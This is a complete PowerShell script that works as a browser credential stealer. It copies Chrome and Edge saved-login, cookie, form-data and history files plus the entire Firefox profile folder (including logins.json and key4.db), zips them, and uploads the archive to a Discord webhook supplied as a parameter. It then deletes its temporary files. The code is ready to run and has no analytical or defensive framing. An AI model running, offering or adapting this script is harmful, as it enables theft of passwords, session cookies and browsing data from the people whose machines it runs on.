param(
    [string]$WebhookUrl = ''
)

if ([string]::IsNullOrEmpty($WebhookUrl)) {
    Write-Error "No webhook URL provided. Exiting script."
    exit 1
}

# Define temp paths
$tempDir = Join-Path $env:TEMP 'BrowserData'
$zipPath = Join-Path $env:TEMP 'bd.zip'

# Clean up old data
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

# Create temp directory
New-Item -ItemType Directory -Path $tempDir | Out-Null

# Files to grab from Chrome and Edge profiles
$browserFiles = @(
    "Login Data",
    "Web Data",
    "Cookies",
    "History"
)

# Chrome paths
$chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
foreach ($file in $browserFiles) {
    $source = Join-Path $chromeUserData $file
    if (Test-Path $source) {
        Copy-Item $source -Destination (Join-Path $tempDir "Chrome_$file") -Force
    }
}

# Edge paths
$edgeUserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
foreach ($file in $browserFiles) {
    $source = Join-Path $edgeUserData $file
    if (Test-Path $source) {
        Copy-Item $source -Destination (Join-Path $tempDir "Edge_$file") -Force
    }
}

# Firefox profile copy (includes cookies.sqlite, key4.db, logins.json, places.sqlite)
$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfiles) {
    Copy-Item $firefoxProfiles -Destination (Join-Path $tempDir 'FirefoxData') -Recurse -Force
}

# Zip collected data
Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

# Prepare multipart form data for Discord upload
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$header = "multipart/form-data; boundary=`"$boundary`""
$bytes = [System.IO.File]::ReadAllBytes($zipPath)

# Multipart body header for file upload
$bodyHeader = (
    "--$boundary$LF" +
    'Content-Disposition: form-data; name="file"; filename="BrowserData.zip"' + $LF +
    'Content-Type: application/zip' + $LF + $LF
)

# Multipart body footer
$bodyFooter = "$LF--$boundary--$LF"

# Convert header and footer to bytes
$headerBytes = [System.Text.Encoding]::ASCII.GetBytes($bodyHeader)
$footerBytes = [System.Text.Encoding]::ASCII.GetBytes($bodyFooter)

# Combine all bytes for request body
$bodyBytes = New-Object byte[] ($headerBytes.Length + $bytes.Length + $footerBytes.Length)
[Array]::Copy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
[Array]::Copy($bytes, 0, $bodyBytes, $headerBytes.Length, $bytes.Length)
[Array]::Copy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $bytes.Length, $footerBytes.Length)

# Send HTTP POST request to Discord webhook
Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType $header -Body $bodyBytes

# Cleanup
Remove-Item $tempDir -Recurse -Force
Remove-Item $zipPath -Force
